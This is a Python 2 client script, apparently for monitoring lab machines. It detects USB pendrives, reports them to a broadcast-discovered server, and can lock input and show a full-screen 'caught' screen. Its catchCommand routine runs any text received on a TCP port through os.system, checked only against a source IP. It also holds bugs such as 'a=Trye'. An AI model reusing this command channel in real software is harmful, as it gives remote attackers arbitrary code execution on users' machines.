import socket
import platform
import os
import time
from threading import Thread
from Tkinter import *

if os.name=='nt':
    import pythoncom, pyHook
    from hideunhide import *
    
var = {}
mon_th={}
var['Lock']=False 
var['StrictMode']=False
var['connected']=False   
list_id=[]
id = os.popen('xinput |grep -iv "master"|grep -iv "core"|grep -P -o "id=[0-9]+"|grep -P -o "[0-9]+"')
for i in id:
    list_id.append(i)
#

def lockSystem():
    for i in list_id:
        os.system("xinput disable " + i )

def unlockSystem():
    for i in list_id:
        os.system("xinput enable " + i)

def disable_input(event):
    if var['Lock']==False:
        return True
    else:
        return False
    
def win_locker():
    hm = pyHook.HookManager()
    hm.KeyAll = disable_input
    hm.MouseAll=disable_input
    hm.HookMouse()
    hm.HookKeyboard()
    pythoncom.PumpMessages()

    
def uni_locker():
    a=True
    while True:
        if var['Lock']==True and a==True:
            lockSystem()
            a=False
        elif var['Lock']==False and a==False:
            unlockSystem()
            a=Trye
        time.sleep(3)    
            
def sys_locker():
    if os.name=='nt':
        win_locker()
    else:
        uni_locker()



    
class SplashScreen(Frame):
    def __init__(self, master=None, width=1, height=1, useFactor=True):
        Frame.__init__(self, master)
        self.pack(side=TOP, fill=BOTH, expand=YES)

        ws = self.master.winfo_screenwidth()
        hs = self.master.winfo_screenheight()
        w = (useFactor and ws*width) or width
        h = (useFactor and ws*height) or height
        x = (ws/2) - (w/2)
        y = (hs/2) - (h/2) 
        self.master.geometry('%dx%d+%d+%d' % (w, h, x, y))
        
        self.master.overrideredirect(True)
        self.lift()

def backup(root):
    if var['Lock']==False:
        if os.name=='nt':
            unhide_taskbar()
        root.destroy()

def createSplashScreen():
    root = Tk()
    if os.name=='nt':
            hide_taskbar()
    sp = SplashScreen(root)
    sp.config(bg="#3366ff")

    m = Label(sp, text="And You Have Been Caught Now!!")
    m.pack(side=TOP, expand=YES)
    m.config(bg="#3366ff", justify=CENTER, font=("calibri", 100))
    root.attributes("-topmost", True)
    root.after(200,backup,root)
    var['Lock']=True
    root.mainloop()
def un_lock(arg):
    var['Lock']=False

    
def set_strict(arg):
    print arg[1]
    if arg[1]=='True':
        var['StrictMode']=True
    else:
        var['StrictMode']=False

def check(arg):
    arg= arg.rstrip('\r\n')
    print arg==':unlock'
    if arg[0]==':':
        if arg[1:]=='unlock':
            un_lock(arg)
        else:
            arg=arg.split(' ')
            set_strict(arg)
    else:
        os.system(arg)

    
def catchCommand():#b
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR ,1)
    server.bind((var['host'],var['comport']))
    server.listen(1)
    while True:
        if var['connected']==True:
            try:
                read,add=server.accept()
                if add[0]!=var['serveradd']: 
                    read.close()
                    continue
                comm=read.recv(2048)
                check(comm)
            except:
                comm='/error'
            finally:
                read.close()

def pendrive_dec_win():
    a=os.popen("wmic logicaldisk get description")
    dev_list=a.read()
    if "Removable" in dev_list:
        return True
    else:
        return False
    
def pendrive_dec_lin():
    a=os.popen("lsblk -nl -d")
    b=[]
    for c in a:
        b.append(c.split()[2])
    if '1' in b:
        return True
    else:
        return False

def pendriveDetection():
    if var['osName']=='nt':
        fun=pendrive_dec_win
    elif var['osName']=='posix':
        fun=pendrive_dec_lin
    while True:
        try:
            if var['pendrive']==True and var['connected']==True:
                if var['StrictMode']==True:
                    var['send'].send(str(var['pendrive'].real)+var['escape'])
                    createSplashScreen()
                else:
                    var['send'].send(str(var['pendrive'].real)+var['escape'])    
                time.sleep(var['sleep_time'])
            else:
                var['pendrive']=fun()
                time.sleep(1)
        except:
            var['connected']=False
            var['send'].close()
            pass
    
def connection():
    while True:
        if var['connected']==False:
            server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            server.bind((var['host'],var['sport']))
            client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            read,addr=server.recvfrom(2048)
            if read == 'STRICT':
                var['StrictMode']=True
            else:
                var['StrictMode']=False
            client.connect((addr[0],9999))
            time.sleep(1)
            client.send(var['platfName']+var['escape'])
            client.send(var['osName']+var['escape'])
            client.send(str(var['pendrive'].real)+var['escape'])
            var['send']=client
            var['serveradd']=addr[0]
            var['connected']=True
        else:
            time.sleep(var['sleep_time'])


if __name__ == '__main__':    
    var['escape']='\r\n' #used in tcp message to show end of line            
    var['host']=socket.gethostname()
    var['sport']=6060
    var['comport']=2121
    var['platfName']=platform.uname()[1]
    var['osName']=os.name
    var['pendrive']=False
    var['sleep_time']=10
    
    mon_th['broadcast']=Thread(target=connection,args=())
    mon_th['lock']=Thread(target=sys_locker ,args=())
    mon_th['servcomm']=Thread(target=catchCommand,args=())
    mon_th['broadcast'].daemon=True
    mon_th['lock'].daemon=True
    mon_th['servcomm'].daemon=True
    mon_th['broadcast'].start()
    mon_th['lock'].start()
    mon_th['servcomm'].start()
    pendriveDetection()#it will use the graphical user system ............
